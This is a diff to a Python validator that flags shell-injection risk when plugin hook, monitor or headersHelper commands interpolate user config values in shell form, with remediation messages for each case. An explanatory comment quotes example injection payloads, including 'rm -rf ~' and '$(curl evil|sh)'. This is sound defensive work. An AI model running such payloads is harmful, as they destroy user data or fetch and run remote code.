@@ -105,6 +105,96 @@ EVENTS_WITHOUT_MATCHERS = {
 # Valid hook types (5 as of v2.1.118: command, http, mcp_tool, prompt, agent).
 VALID_HOOK_TYPES = {"command", "http", "mcp_tool", "prompt", "agent"}
 
+# ---------------------------------------------------------------------------
+# CC v2.1.207 — ${user_config.*} in a SHELL-FORM command is REJECTED
+# ---------------------------------------------------------------------------
+# WHY (do not "simplify" this away): Claude Code v2.1.207 shipped a
+# SHELL-INJECTION fix. Verbatim from the changelog:
+#
+#   "Plugin hooks/monitors/MCP headersHelper: ${user_config.*} in shell-form
+#    commands is now rejected (shell-injection fix). Hooks: use exec form
+#    (`args` array) or $CLAUDE_PLUGIN_OPTION_<KEY>; monitors and
+#    headersHelper: read the value inside the script (config file or the
+#    server's `env` block)."
+#
+# A shell-form command is a single string handed to a shell. Interpolating a
+# user-supplied config value into it lets the VALUE carry shell metacharacters
+# (`; rm -rf ~`, `$(curl evil|sh)`, backticks) that the shell then EXECUTES —
+# the value escapes its argument slot and becomes code. Claude Code now refuses
+# to run such a command, so a plugin shipping one is BROKEN at runtime as well
+# as unsafe; hence CRITICAL, not a warning.
+#
+# THE WHOLE DISCRIMINATOR IS SHELL-FORM vs EXEC-FORM. Exec form
+# (`{"command": "node", "args": ["...", "${user_config.x}"]}`) spawns the
+# program directly with an argv vector — NO shell parses the value, so the
+# value can never become code. Exec form therefore stays LEGAL and must NEVER
+# be flagged. Flagging it would be a false positive on the very construct the
+# spec prescribes as the fix.
+#
+# The token grammar is deliberately permissive (`[^{}]+` after the dot): any
+# `${user_config.<anything>}` interpolation is the rejected shape, so an
+# unusual/dotted key cannot slip through as a false negative.
+USER_CONFIG_INTERP_RE = re.compile(r"\$\{user_config\.[^{}]+\}")
+
+# Per-surface remediation, straight from the changelog. Each surface has a
+# DIFFERENT legal alternative, so a single generic message would misdirect.
+USER_CONFIG_REMEDIATION = {
+    "hook": (
+        "use exec form (move the value into the 'args' array, which is spawned "
+        "directly with no shell) or read it from the $CLAUDE_PLUGIN_OPTION_<KEY> "
+        "environment variable inside the script"
+    ),
+    "monitor": (
+        "read the value inside the script itself (from a config file, or from the "
+        "$CLAUDE_PLUGIN_OPTION_<KEY> environment variable) instead of interpolating "
+        "it into the monitor's shell command"
+    ),
+    "headersHelper": (
+        "read the value inside the helper script itself (from a config file, or from "
+        "the MCP server's `env` block) instead of interpolating it into the "
+        "headersHelper command"
+    ),
+}
+
+
+def find_user_config_interpolations(text: object) -> list[str]:
+    """Return every ``${user_config.<key>}`` token in ``text`` (CC v2.1.207).
+
+    The single source of truth for the shell-injection rule. ``validate_mcp``
+    (headersHelper) and ``validate_plugin`` (monitors + inline plugin.json
+    hooks) import this rather than re-deriving the pattern — a second copy of
+    the grammar would drift, and a drifted copy of a SECURITY rule is a false
+    negative.
+
+    ``text`` is typed ``object``, not ``str``, ON PURPOSE: every caller feeds it
+    a value parsed from an untrusted plugin's JSON, where ``command`` may be a
+    number, a list, or null in a malformed manifest. A validator must survive
+    that input, so the isinstance guard is load-bearing — annotate it ``str``
+    and the type checker (rightly) calls the guard unreachable, inviting someone
+    to delete it and crash the scan on the first malformed plugin.
+
+    Callers are responsible for the shell-form-vs-exec-form decision: this
+    helper only finds the tokens, it does not judge the surface.
+    """
+    if not isinstance(text, str):
+        return []
+    return USER_CONFIG_INTERP_RE.findall(text)
+
+
+def user_config_shell_finding(surface: str, tokens: list[str], where: str) -> str:
+    """Build the CRITICAL message for a rejected shell-form interpolation.
+
+    ``surface`` is one of ``USER_CONFIG_REMEDIATION``'s keys; ``where`` is a
+    human-readable location (e.g. ``"hooks.json PreToolUse hook"``).
+    """
+    listed = ", ".join(sorted(set(tokens)))
+    return (
+        f"[RC-USERCFG-SHELL-INJECT] {where} interpolates {listed} into a SHELL-FORM "
+        "command. Claude Code v2.1.207 REJECTS this (shell-injection fix) — the hook/"
+        "monitor/helper will not run, and a config value carrying shell metacharacters "
+        f"would otherwise execute as code. Fix: {USER_CONFIG_REMEDIATION[surface]}."
+    )
+
 # NOTE: COMMAND_ONLY_EVENTS (tier 2 — no prompt/agent) and COMMAND_STRICT_EVENTS
 # (tier 3 — command/mcp_tool only) are imported at the top of this module from
 # cpv_validation_common, the single source of truth for the per-event hook-type
